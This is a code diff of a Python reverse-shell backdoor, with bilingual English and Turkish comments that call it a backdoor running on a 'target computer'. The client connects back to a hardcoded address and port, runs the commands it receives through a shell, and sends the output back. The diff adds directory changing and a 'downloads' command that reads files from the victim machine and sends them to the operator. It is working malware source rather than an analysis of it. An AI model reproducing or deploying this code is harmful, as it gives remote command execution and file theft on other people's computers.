@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import json
+import os
 
 class MySocket:
     def __init__(self,ip,port):
@@ -20,7 +21,16 @@ class MySocket:
                 return json.loads(json_data) 
             except ValueError:
                 continue
-
+ #In order to change the directory in the backdoor application, we need to make the cd command available.--Arka kapı uygulamasında dizini değiştirmek için cd komutunu kullanılabilir hale getirmemiz gerekiyor.   
+    def command_directory(self,directory):#We write this function to add the "change directory" feature to the cd command.--Bu işlevi cd komutuna "dizin değiştir" özelliğini eklemek için yazıyoruz.
+        os.chdir(directory)
+        return "Cd to " + directory
+    
+    
+    def get_file_content(self,path):
+        with open(path, "rb") as myfile:#We find the file to be downloaded on the target computer, read it as binary and save it in a file named myfile.--Hedef bilgisayarda indirilecek dosyayı bulup ikili olarak okuyor ve myfile adlı bir dosyaya kaydediyoruz.
+            return myfile.read()
+    
     def command_execution(self,command):
         return subprocess.check_output(command, shell = True)#We write a function that processes the incoming commands on our target computer.--Hedef bilgisayarımıza gelen komutları işleyen bir fonksiyon yazıyoruz.
 
@@ -37,7 +47,13 @@ class MySocket:
             if command[0] == "quit":
                 self.my_connection.close()
                 exit()
-            command_output = self.command_execution(command)#We assign an output of the command execution function to the variable.--Değişkene komut yürütme işlevinin bir çıktısını atarız.
+            elif command[0] == "cd" and len(command)>1:
+                command_output = self.command_directory(command[1])
+            elif command[0] == "downloads":
+                command_output = self.get_file_content(command[1])
+                
+            else:
+                command_output = self.command_execution(command)#We assign an output of the command execution function to the variable.--Değişkene komut yürütme işlevinin bir çıktısını atarız.
             self.json.send(command_output)#We send the command output to the host computer with the send method.--Komut çıktısını, gönderme yöntemi ile ana bilgisayara gönderiyoruz.
         self.my_connection.close()
 socket_object=MySocket("10.0.2.7", 8080)
